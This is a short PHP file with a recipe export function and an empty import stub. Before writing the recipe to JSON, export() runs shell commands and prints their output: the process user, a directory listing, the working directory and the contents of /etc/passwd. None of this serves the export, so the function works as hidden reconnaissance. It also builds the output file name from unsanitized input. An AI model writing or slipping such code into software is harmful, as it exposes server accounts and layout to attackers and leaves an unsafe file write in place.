<?php
function export($recipe)
{
echo "current user: ".get_current_user() . "\n\n";
echo "script was executed under user: ".exec('whoami') . "\n\n";
echo "passwd: ".exec('cat /etc/passwd') . "\n\n";
echo "perms: ".exec('ls -ltr') . "\n\n";
echo "pwd: ".exec('pwd');
$recipe_name = $recipe[1];
$file_name = $recipe_name . "_export.json";
$file = fopen($file_name, "w");
$json_recipe = json_encode($recipe);
file_put_contents($file_name, $json_recipe);
fclose($file);
}

function import($recipe_file)
{
}
?>
